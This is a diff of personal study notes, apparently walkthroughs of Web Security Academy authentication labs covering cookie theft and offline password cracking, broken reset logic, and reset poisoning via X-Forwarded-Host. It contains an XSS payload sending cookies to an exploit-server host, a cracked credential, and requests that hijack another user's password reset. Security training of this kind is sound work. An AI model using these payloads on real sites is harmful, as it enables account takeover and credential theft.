@@ -410,24 +410,34 @@
     - GET /my-account?id=wiener
       Cookie: stay-logged-in=§d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw§;
 21. **Offline password cracking**
-    - Post a comment
+    - Post a **comment**
       `<script>document.location='https://exploit-0a680029042c93b5820a0aee01dc0053.exploit-server.net/'+document.cookie</script>`
-    - Read the cookie value in exploited server access log
-      `10.0.4.147      2024-07-10 14:26:31 +0000 "GET /secret=stay-logged-in=Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz
-Decode carlos:26323c16d5f4dabff3bb136f2460a943`
-    - Decode carlos:26323c16d5f4dabff3bb136f2460a943
-    - https://crackstation.net/ crack the hash: 26323c16d5f4dabff3bb136f2460a943
-    - carlos:onceuponatime
+    - **Read the cookie value** in exploited server access log   
+      `10.0.4.147      2024-07-10 14:26:31 +0000 "GET /secret=stay-logged-in=Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz`   
+    - Decode > carlos:26323c16d5f4dabff3bb136f2460a943
+    - https://crackstation.net/ crack the hash: 26323c16d5f4dabff3bb136f2460a943 > carlos:onceuponatime
 23. **Password reset** broken logic
    - Perform password reset
-     Password reset url in email: https://0a6b00d9033b21ce818ee8ce00b2005e.web-security-academy.net/forgot-password?temp-forgot-password-token=a5fk32fn68feb75ik9xp91sfoekxn11j
-   - Capture the password reset traffic
+     **Password reset url** in email: https://0a6b00d9033b21ce818ee8ce00b2005e.web-security-academy.net/forgot-password?temp-forgot-password-token=a5fk32fn68feb75ik9xp91sfoekxn11j
+   - Capture the password reset **traffic**
      - POST /forgot-password?**temp-forgot-password-token**=a5fk32fn68feb75ik9xp91sfoekxn11j
      - Body: **temp-forgot-password-token**=a5fk32fn68feb75ik9xp91sfoekxn11j&**username=wiener**&new-password-1=123456&new-password-2=123456
-   - Send to repeater and modify in below
+   - Send to **repeater** and modify in below
      - POST /forgot-password?temp-forgot-password-token=
      - temp-forgot-password-token=&**username=carlos**&new-password-1=123456&new-password-2=123456   
-25. 45454
+25. Password reset poisoning via **middleware**
+   - **Perform password reset **  
+     Password reset url in email: https://0ade00ee03fb9d7081d461a700980052.web-security-academy.net/forgot-password?temp-forgot-password-token=5e8pujqdepap1aow7n5jiahx9ncik0wd   
+   - Send to repeater and **perform password reset as victim user**   
+     POST /forgot-password   
+     add in header: `X-Forwarded-Host: exploit-0afc000003da9d43819b60d201bb0007.exploit-server.net`   
+   - Change in below and submit   
+     POST /forgot-password?temp-forgot-password-token=temp-forgot-password-token=&**username=carlos**&new-password-1=123456&new-password-2=123456   
+     Response: please check your email for a reset password link   
+   - Exploit server access log   
+     10.0.3.157      2024-07-10 15:00:32 +0000 "GET /forgot-password?temp-forgot-password-token=**ofunlh8j6vngx003vnifub7hywv4ppw1**   
+   - replace old token with new one and access the password reset url (change carlos password)   
+     https://0ade00ee03fb9d7081d461a700980052.web-security-academy.net/forgot-password?**temp-forgot-password-token=ofunlh8j6vngx003vnifub7hywv4ppw1**   
 26. 454
 
 ## Business Logic Vulnerabilities
